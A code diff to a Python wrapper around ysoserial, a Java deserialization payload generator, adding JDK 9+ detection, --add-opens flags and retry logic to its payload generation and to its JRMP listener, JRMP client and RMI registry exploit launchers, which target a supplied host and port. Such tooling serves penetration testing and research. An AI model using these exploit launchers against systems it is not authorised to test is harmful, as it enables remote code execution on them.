@@ -27,6 +27,46 @@ _GADGET_PATTERN = re.compile(r"^\s{3,}(\w+)\s+@\w+", re.MULTILINE)
 
 _TIMEOUT_GENERATE = 30  # seconds
 
+# --add-opens flags required for ysoserial gadgets that use internal reflection
+# on JDK 9+ (strong encapsulation). CommonsCollections1 needs sun.reflect.annotation;
+# JRMP-based gadgets need sun.rmi.transport.
+_YSOSERIAL_OPENS: tuple[str, ...] = (
+    "--add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED",
+    "--add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED",
+)
+
+# Module-level cache for detected Java major version (populated on first use).
+_JAVA_MAJOR_VERSION: int | None = None
+
+
+def _detect_java_major_version() -> int:
+    """Return the major JVM version (8, 11, 17, …). Returns 0 if undetectable."""
+    global _JAVA_MAJOR_VERSION
+    if _JAVA_MAJOR_VERSION is not None:
+        return _JAVA_MAJOR_VERSION
+    version = 0
+    try:
+        proc = subprocess.run(
+            ["java", "-version"],
+            capture_output=True,
+            timeout=10,
+        )
+        raw = proc.stderr or proc.stdout or b""
+        output = raw.decode(errors="replace") if isinstance(raw, bytes) else ""
+        m = re.search(r'"(\d+)(?:\.(\d+))?', output)
+        if m:
+            major = int(m.group(1))
+            version = int(m.group(2)) if major == 1 else major
+    except Exception:
+        pass
+    _JAVA_MAJOR_VERSION = version
+    return version
+
+
+def _java_opens() -> list[str]:
+    """Return --add-opens flags for ysoserial when running on JDK 9+."""
+    return list(_YSOSERIAL_OPENS) if _detect_java_major_version() >= 9 else []
+
 
 def _find_ysoserial_jar() -> Path | None:
     """Locate ysoserial.jar using the documented search order."""
@@ -79,6 +119,9 @@ class YsoserialWrapper:
         # Per-instance cache (I.2) — keyed on (gadget, command).
         # Instance-level so that different jar_path instances don't share state.
         self._cache: dict[str, bytes] = {}
+        # Tracks whether this JVM needs --add-opens for ysoserial gadgets.
+        # None = unknown (auto-detect on first failed generate), True/False = detected.
+        self._needs_opens: bool | None = None
 
     # ------------------------------------------------------------------
     # Public API
@@ -95,12 +138,12 @@ class YsoserialWrapper:
         if cache_key in self._cache:
             return self._cache[cache_key]
 
+        # Build command: include --add-opens only if already known to be needed.
+        opens = list(_YSOSERIAL_OPENS) if self._needs_opens else []
+        cmd = ["java"] + opens + ["-jar", str(self._jar), gadget, command]
+
         try:
-            result = subprocess.run(
-                ["java", "-jar", str(self._jar), gadget, command],
-                capture_output=True,
-                timeout=_TIMEOUT_GENERATE,
-            )
+            result = subprocess.run(cmd, capture_output=True, timeout=_TIMEOUT_GENERATE)
         except subprocess.TimeoutExpired as exc:
             raise PayloadError(f"ysoserial timed out after {_TIMEOUT_GENERATE}s") from exc
         except FileNotFoundError as exc:
@@ -108,11 +151,40 @@ class YsoserialWrapper:
 
         payload = result.stdout
         if not payload:
-            stderr_hint = result.stderr.decode(errors="replace")[:200]
-            raise PayloadError(
-                f"ysoserial returned empty payload for gadget '{gadget}'. "
-                f"Stderr: {stderr_hint}"
+            stderr_text = (
+                result.stderr.decode(errors="replace")
+                if isinstance(result.stderr, bytes)
+                else ""
             )
+            # JDK 9+ strong encapsulation: retry with --add-opens flags.
+            if self._needs_opens is None and (
+                "InaccessibleObjectException" in stderr_text
+                or "--add-opens" in stderr_text
+            ):
+                self._needs_opens = True
+                cmd = ["java"] + list(_YSOSERIAL_OPENS) + ["-jar", str(self._jar), gadget, command]
+                try:
+                    result = subprocess.run(
+                        cmd, capture_output=True, timeout=_TIMEOUT_GENERATE
+                    )
+                except subprocess.TimeoutExpired as exc:
+                    raise PayloadError(f"ysoserial timed out after {_TIMEOUT_GENERATE}s") from exc
+                except FileNotFoundError as exc:
+                    raise PayloadError("java binary not found in PATH") from exc
+                payload = result.stdout
+                stderr_text = (
+                    result.stderr.decode(errors="replace")
+                    if isinstance(result.stderr, bytes)
+                    else ""
+                )
+
+            if not payload:
+                raise PayloadError(
+                    f"ysoserial returned empty payload for gadget '{gadget}'. "
+                    f"Stderr: {stderr_text[:200]}"
+                )
+        elif self._needs_opens is None:
+            self._needs_opens = False
 
         self._cache[cache_key] = payload
         return payload
@@ -125,7 +197,7 @@ class YsoserialWrapper:
     def _gadget_list(self) -> list[str]:
         try:
             result = subprocess.run(
-                ["java", "-jar", str(self._jar)],
+                ["java"] + _java_opens() + ["-jar", str(self._jar)],
                 capture_output=True,
                 timeout=_TIMEOUT_GENERATE,
             )
@@ -159,11 +231,11 @@ class YsoserialWrapper:
         In fork mode, returns a ``Popen`` (background).
         Otherwise, blocks until the listener exits.
         """
-        cmd = [
-            "java", "-cp", str(self._jar),
-            "ysoserial.exploit.JRMPListener",
-            str(port), gadget, command,
-        ]
+        cmd = (
+            ["java"] + _java_opens()
+            + ["-cp", str(self._jar), "ysoserial.exploit.JRMPListener",
+               str(port), gadget, command]
+        )
         if self._fork:
             proc = subprocess.Popen(
                 cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
@@ -184,11 +256,11 @@ class YsoserialWrapper:
         self, host: str, port: int, gadget: str, command: str,
     ) -> subprocess.CompletedProcess:
         """Run ysoserial JRMP client exploit against *host:port*."""
-        cmd = [
-            "java", "-cp", str(self._jar),
-            "ysoserial.exploit.JRMPClient",
-            f"{host}", str(port), gadget, command,
-        ]
+        cmd = (
+            ["java"] + _java_opens()
+            + ["-cp", str(self._jar), "ysoserial.exploit.JRMPClient",
+               host, str(port), gadget, command]
+        )
         try:
             return subprocess.run(
                 cmd, capture_output=True, timeout=_TIMEOUT_GENERATE,
@@ -202,11 +274,11 @@ class YsoserialWrapper:
         self, host: str, port: int, gadget: str, command: str,
     ) -> subprocess.CompletedProcess:
         """Run ysoserial RMI registry exploit against *host:port*."""
-        cmd = [
-            "java", "-cp", str(self._jar),
-            "ysoserial.exploit.RMIRegistryExploit",
-            host, str(port), gadget, command,
-        ]
+        cmd = (
+            ["java"] + _java_opens()
+            + ["-cp", str(self._jar), "ysoserial.exploit.RMIRegistryExploit",
+               host, str(port), gadget, command]
+        )
         try:
             return subprocess.run(
                 cmd, capture_output=True, timeout=_TIMEOUT_GENERATE,
